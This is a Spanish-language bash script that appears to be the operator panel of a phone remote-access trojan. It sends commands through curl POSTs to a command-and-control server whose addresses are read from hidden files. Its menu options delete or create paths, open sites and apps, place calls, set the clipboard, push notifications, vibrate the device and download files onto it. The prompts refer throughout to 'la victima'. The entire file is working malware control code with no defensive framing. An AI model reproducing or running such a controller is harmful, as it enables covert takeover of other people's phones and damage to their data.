HAU=$(cat .op)
HAI=$(cat .list)
bash .banner
echo "1)Borrar una ruta"
echo "2)Abre una web"
echo "3)Crea una ruta"
echo "4)Deja un mensaje en su celular"
echo "5)Notificacion Emerjente"
echo "6)Copiar al portapapeles"
echo "7)Abrir app (Beta)"
echo "8)Llamada telefonica"
echo "9)Activar Bluetooth"
echo "10)Vibrar el telefono"
echo "11)Descargar archivo"
echo "12)Dejar Advertencia en Pantalla"
echo "99)Actualizar"
echo "100)Cerrar secion"
echo ""
echo "Informacion:"
w3m -dump $HAU
w3m -dump $HAI
echo ""
read comand

# Zona de if

HAT=$(cat .com)
HAY=$(cat .ruta)
USER_AGENT=Google

if [ "$comand" = "1" ]; then
bash .banner
echo "Introduce la ruta que deseas eliminar:"
read rute
curl -X POST "$HAT" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$comand"
curl -X POST "$HAY" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$rute"
fi

if [ "$comand" = "2" ]; then
bash .banner
echo "Introduce la web que deseas abrir en el dispositivo:"
read rute
curl -X POST "$HAT" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$comand"
curl -X POST "$HAY" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$rute"
fi

if [ "$comand" = "3" ]; then
bash .banner
echo "Introduce la ruta que deseas crear:"
read rute
curl -X POST "$HAT" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$comand"
curl -X POST "$HAY" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$rute"
fi

if [ "$comand" = "4" ]; then
bash .banner
echo "Escribe un mensaje para la victima:"
read rute
curl -X POST "$HAT" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$comand"
curl -X POST "$HAY" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$rute"
fi

if [ "$comand" = "5" ]; then
bash .banner
echo "Escribe una notificacion emerjente a tu victima:"
read rute
curl -X POST "$HAT" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$comand"
curl -X POST "$HAY" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$rute"
fi

if [ "$comand" = "6" ]; then
bash .banner
echo "Copia algo al portapapeles:"
read rute
curl -X POST "$HAT" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$comand"
curl -X POST "$HAY" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$rute"
fi

if [ "$comand" = "7" ]; then
bash .banner
echo "Paquete de la app que deseas abrir:"
read rute
curl -X POST "$HAT" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$comand"
curl -X POST "$HAY" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$rute"
fi

if [ "$comand" = "8" ]; then
bash .banner
echo "Numero de telefono que deseas llamar:"
read rute
curl -X POST "$HAT" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$comand"
curl -X POST "$HAY" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$rute"
fi

if [ "$comand" = "9" ]; then
bash .banner
echo "Deseas activar el bluetooth:"
read rute
curl -X POST "$HAT" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$comand"
curl -X POST "$HAY" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$rute"
fi

if [ "$comand" = "10" ]; then
bash .banner
echo "Cuanto deseas que vibre el telefono por ms:"
read rute
curl -X POST "$HAT" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$comand"
curl -X POST "$HAY" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$rute"
fi

if [ "$comand" = "11" ]; then
bash .banner
echo "Enlace del archivo que deseas descargar en el dispositivo:"
read rute
curl -X POST "$HAT" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$comand"
curl -X POST "$HAY" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$rute"
fi

# Incompleto

if [ "$comand" = "12" ]; then
bash .banner
echo "El mensaje que deseas dar:"
read rute
curl -X POST "$HAT" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$comand"
curl -X POST "$HAY" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$rute"
fi

# Fin de incompleto

if [ "$comand" = "99" ]; then
bash .ls
fi

if [ "$comand" = "100" ]; then
curl -X POST "$HAT" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$comand"
bash .banner
echo "La victima dejo de recibir tus comandos!!"
read pause
fi

bash .ls

# Fin de If
